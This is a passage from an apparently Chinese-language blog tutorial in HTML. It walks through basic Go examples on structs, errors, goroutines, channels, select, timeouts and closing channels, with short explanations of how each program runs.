class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">package main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>type rect <span class="hljs-keyword">struct</span> &#123;  <br>    width  <span class="hljs-type">int</span>  <br>    height <span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-built_in">func</span> (r *rect) <span class="hljs-built_in">area</span>() <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">return</span> r.width * r.height  <br>&#125;  <br>  <br><span class="hljs-built_in">func</span> (r *rect) <span class="hljs-built_in">c</span>() <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*r.width + <span class="hljs-number">2</span>*r.height  <br>&#125;  <br>  <br>func <span class="hljs-built_in">main</span>() &#123;  <br>    re := rect&#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;  <br>    fmt.<span class="hljs-built_in">Println</span>(re.<span class="hljs-built_in">area</span>())  <br>    fmt.<span class="hljs-built_in">Println</span>(re.<span class="hljs-built_in">c</span>())  <br>&#125;<br></code></pre></td></tr></table></figure><p>golang 也支持在 struct 上定义方法。</p><h2 id="Struct-Embedding"><a href="#Struct-Embedding" class="headerlink" title="Struct Embedding"></a>Struct Embedding</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs csharp">package main  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>type <span class="hljs-keyword">base</span> <span class="hljs-keyword">struct</span> &#123;  <br>    num <span class="hljs-built_in">int</span>  <br>&#125;  <br>  <br>type container <span class="hljs-keyword">struct</span> &#123;  <br>    <span class="hljs-keyword">base</span>  <br>    str <span class="hljs-built_in">string</span>  <br>&#125;  <br>  <br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> &#123;  <br>    c := container&#123;<span class="hljs-keyword">base</span>&#123;  <br>       num: <span class="hljs-number">1</span>,  <br>    &#125;, <span class="hljs-string">&quot;test&quot;</span>&#125;  <br>    fmt.Println(c.<span class="hljs-keyword">base</span>, c.str, c.num, c.<span class="hljs-keyword">base</span>.num)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;errors&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f</span><span class="hljs-params">(arg <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;  <br>    <span class="hljs-keyword">if</span> arg == <span class="hljs-number">42</span> &#123;  <br>  <br>       <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>, errors.New(<span class="hljs-string">&quot;can&#x27;t work with 42&quot;</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> arg + <span class="hljs-number">3</span>, <span class="hljs-literal">nil</span>  <br>  <br>&#125;  <br>  <br><span class="hljs-keyword">var</span> ErrOutOfTea = fmt.Errorf(<span class="hljs-string">&quot;no more tea available&quot;</span>)  <br><span class="hljs-keyword">var</span> ErrPower = fmt.Errorf(<span class="hljs-string">&quot;can&#x27;t boil water&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeTea</span><span class="hljs-params">(arg <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">error</span> &#123;  <br>    <span class="hljs-keyword">if</span> arg == <span class="hljs-number">2</span> &#123;  <br>       <span class="hljs-keyword">return</span> ErrOutOfTea  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> arg == <span class="hljs-number">4</span> &#123;  <br>       <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;making tea: %w&quot;</span>, ErrPower)  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    err := makeTea(<span class="hljs-number">2</span>)  <br>    fmt.Println(err)  <br>    _, err = f(<span class="hljs-number">42</span>)  <br>    fmt.Println(err)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Goroutines"><a href="#Goroutines" class="headerlink" title="Goroutines"></a>Goroutines</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">a</span><span class="hljs-params">(from <span class="hljs-type">string</span>)</span></span> &#123;  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ &#123;  <br>       fmt.Println(from, <span class="hljs-string">&quot; : &quot;</span>, i)  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    a(<span class="hljs-string">&quot;direct&quot;</span>)  <br>    <span class="hljs-keyword">go</span> a(<span class="hljs-string">&quot;goroutine&quot;</span>)  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(msg <span class="hljs-type">string</span>)</span></span> &#123;  <br>       fmt.Println(msg)  <br>    &#125;(<span class="hljs-string">&quot;going&quot;</span>)  <br>    time.Sleep(time.Second)  <br>    fmt.Println(<span class="hljs-string">&quot;done&quot;</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    messages := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       messages &lt;- <span class="hljs-string">&quot;ping&quot;</span>  <br>    &#125;()  <br>    msg := &lt;-messages  <br>    fmt.Println(msg)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Channel-Buffering"><a href="#Channel-Buffering" class="headerlink" title="Channel Buffering"></a>Channel Buffering</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    messages := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">2</span>)  <br>    messages &lt;- <span class="hljs-string">&quot;buffered&quot;</span>  <br>    messages &lt;- <span class="hljs-string">&quot;channel&quot;</span>  <br>  <br>    fmt.Println(&lt;-messages)  <br>    fmt.Println(&lt;-messages)  <br>&#125;<br></code></pre></td></tr></table></figure><p>channel 默认是无缓冲的，因此需要有另一个 channel 接收。但是如果设置了有缓存的，则不需要。</p><h2 id="Channel-Synchronization"><a href="#Channel-Synchronization" class="headerlink" title="Channel Synchronization"></a>Channel Synchronization</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(done <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)</span></span> &#123;  <br>    fmt.Println(<span class="hljs-string">&quot;working&quot;</span>)  <br>    time.Sleep(time.Second)  <br>    fmt.Println(<span class="hljs-string">&quot;done&quot;</span>)  <br>    done &lt;- <span class="hljs-literal">true</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>)  <br>    <span class="hljs-keyword">go</span> worker(done)  <br>  <br>    &lt;-done  <br>&#125;<br></code></pre></td></tr></table></figure><p>代码中的 &lt;-done 表示主程序从通道 done中接收数据。在该程序中，当 worker goroutine 完成其工作后，它会将一个布尔值发送到 done 通道，而主程序则等待从 done 通道接收数据。<br>如果删除了&lt;-done，主程序就不会等待worker goroutine完成其工作。虽然worker goroutine可能会成功地将一个布尔值发送到通道中（因为通道是有缓冲的，所以发送不会被阻塞），但是主程序不会等待这个值的接收，而是直接退出了。<br>这样一来，即使 worker goroutine 已经完成了它的工作，主程序也提前退出了，整个程序也就结束了。</p><h2 id="Channel-Directions"><a href="#Channel-Directions" class="headerlink" title="Channel Directions"></a>Channel Directions</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ping</span><span class="hljs-params">(pings <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>, msg <span class="hljs-type">string</span>)</span></span> &#123;  <br>    pings &lt;- msg  <br>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pong</span><span class="hljs-params">(pings &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, pongs <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>)</span></span> &#123;  <br>    msg := &lt;-pings  <br>    pongs &lt;- msg  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    pings := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    pongs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    ping(pings, <span class="hljs-string">&quot;passed message&quot;</span>)  <br>    pong(pings, pongs)  <br>    fmt.Println(&lt;-pongs)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h2><p>在 Go 语言中，select 语句用于处理多个通道操作。它类似于 switch 语句，但用于通道操作。select 语句使得一个 Go 程序可以等待多个通道操作同时响应。</p><ul><li>多通道操作：select 语句允许在多个通道上等待操作，一次只处理一个准备好的通道操作。</li><li>随机选择：如果多个 case 同时准备好，select 会随机选择其中一个来执行。</li><li>无阻塞等待：如果没有任何通道准备好，select 会立即执行 default 语句（如果存在）。这种特性使得 select 语句可以用于非阻塞的通道操作。</li><li>阻塞等待：如果没有 default 语句，并且所有 case 都没有准备好，select 语句会阻塞，直到其中一个 case 准备好。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    c1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    c2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second)  <br>       c1 &lt;- <span class="hljs-string">&quot;one&quot;</span>  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second * <span class="hljs-number">2</span>)  <br>       c2 &lt;- <span class="hljs-string">&quot;two&quot;</span>  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++ &#123;  <br>       <span class="hljs-keyword">select</span> &#123;  <br>       <span class="hljs-keyword">case</span> msg1 := &lt;-c1:  <br>          fmt.Println(<span class="hljs-string">&quot;received&quot;</span>, msg1)  <br>       <span class="hljs-keyword">case</span> msg2 := &lt;-c2:  <br>          fmt.Println(<span class="hljs-string">&quot;received&quot;</span>, msg2)  <br>       &#125;  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    c1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second * <span class="hljs-number">2</span>)  <br>       c1 &lt;- <span class="hljs-string">&quot;result 1&quot;</span>  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> res := &lt;-c1:  <br>       fmt.Println(res)  <br>    <span class="hljs-keyword">case</span> &lt;-time.After(<span class="hljs-number">1</span> * time.Second):  <br>       fmt.Println(<span class="hljs-string">&quot;timeout 1&quot;</span>)  <br>    &#125;  <br>  <br>    c2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       time.Sleep(time.Second * <span class="hljs-number">2</span>)  <br>       c2 &lt;- <span class="hljs-string">&quot;result 2&quot;</span>  <br>    &#125;()  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> res := &lt;-c2:  <br>       fmt.Println(res)  <br>    <span class="hljs-keyword">case</span> &lt;-time.After(<span class="hljs-number">3</span> * time.Second):  <br>       fmt.Println(<span class="hljs-string">&quot;timeout 2&quot;</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Non-Blocking-Channel-Operations"><a href="#Non-Blocking-Channel-Operations" class="headerlink" title="Non-Blocking Channel Operations"></a>Non-Blocking Channel Operations</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    messages := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)  <br>    signals := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)  <br>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> msg := &lt;-messages:  <br>       fmt.Println(<span class="hljs-string">&quot;received messages&quot;</span>, msg)  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;no messages received&quot;</span>)  <br>    &#125;  <br>  <br>    msg := <span class="hljs-string">&quot;hi&quot;</span>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> messages &lt;- msg:  <br>       fmt.Println(<span class="hljs-string">&quot;sent message&quot;</span>, msg)  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;no message sent&quot;</span>)  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">select</span> &#123;  <br>    <span class="hljs-keyword">case</span> msg := &lt;-messages:  <br>       fmt.Println(<span class="hljs-string">&quot;received messages&quot;</span>, msg)  <br>    <span class="hljs-keyword">case</span> sig := &lt;-signals:  <br>       fmt.Println(<span class="hljs-string">&quot;received signal&quot;</span>, sig)  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;no activity&quot;</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的通道是无缓存的，因此 msg 无法发送到通道中，阻塞。</p><h2 id="Closing-Channels"><a href="#Closing-Channels" class="headerlink" title="Closing Channels"></a>Closing Channels</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    jobs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">5</span>)  <br>    done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       <span class="hljs-keyword">for</span> &#123;  <br>          j, more := &lt;-jobs  <br>          <span class="hljs-keyword">if</span> more &#123;  <br>             fmt.Println(<span class="hljs-string">&quot;received job&quot;</span>, j)  <br>          &#125; <span class="hljs-keyword">else</span> &#123;  <br>             fmt.Println(<span class="hljs-string">&quot;received all jobs&quot;</span>)  <br>             done &lt;- <span class="hljs-literal">true</span>  <br>             <span class="hljs-keyword">return</span>  <br>          &#125;  <br>       &#125;  <br>    &#125;()  <br>  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">3</span>; j++ &#123;  <br>       jobs &lt;- j  <br>       fmt.Println(<span class="hljs-string">&quot;sent job&quot;</span>, j)  <br>    &#125;  <br>    <span class="hljs-built_in">close</span>(jobs)  <br>    fmt.Println(<span class="hljs-string">&quot;sent all jobs&quot;</span>)  <br>  <br>    &lt;-done  <br>    _, ok := &lt;-jobs  <br>    fmt.Println(<span class="hljs-string">&quot;received more jobs:&quot;</span>, ok)  <br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码运行结果为：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">sent</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">1</span><br><span class="hljs-variable">sent</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">2</span><br><span class="hljs-variable">sent</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">3</span><br><span class="hljs-variable">sent</span> <span class="hljs-variable">all</span> <span class="hljs-variable"><span class="hljs-class">jobs</span></span><br><span class="hljs-variable">received</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">1</span><br><span class="hljs-variable">received</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">2</span><br><span class="hljs-variable">received</span> <span class="hljs-variable"><span class="hljs-class">job</span></span> <span class="hljs-number">3</span><br><span class="hljs-variable">received</span> <span class="hljs-variable">all</span> <span class="hljs-variable"><span class="hljs-class">jobs</span></span><br><span class="hljs-variable">received</span> <span class="hljs-variable">more</span> <span class="hljs-variable"><span class="hljs-class">jobs</span></span>: <span class="hljs-variable"><span class="hljs-literal">false</span></span><br></code></pre></td></tr></table></figure><p>首先，在主线程中，进入循环，每次打印出 sent job，3 次之后，关闭 jobs 通道，并且打印 sent all jobs，此时，&lt;-done 的作用是阻塞主线程，等待从 done 中接收一个值，在此期间 goroutine 接收到 jobs 的消息，并且打印出 received jobs，3 次之后，received all jobs，并且给 done 复制，此时阻塞继续执行，由于 jobs 已经关闭，因此 ok 为 false，打印 received more jobs： false。</p><h2 id="Range-over-Channels"><a href="#Range-over-Channels" class="headerlink" title="Range over Channels"></a>Range over Channels</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    queue := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">2</span>)  <br>    queue &lt;- <span class="hljs-string">&quot;one&quot;</span>  <br>    queue &lt;- <span class="hljs-string">&quot;two&quot;</span>  <br>    <span class="hljs-built_in">close</span>(queue)  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> queue &#123;  <br>       fmt.Println(i)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Timers"><a href="#Timers" class="headerlink" title="Timers"></a>Timers</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arcade">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br>func main() &#123;  <br>    <span class="hljs-attr">time1</span> := <span class="hljs-built_in">time</span>.NewTimer(<span 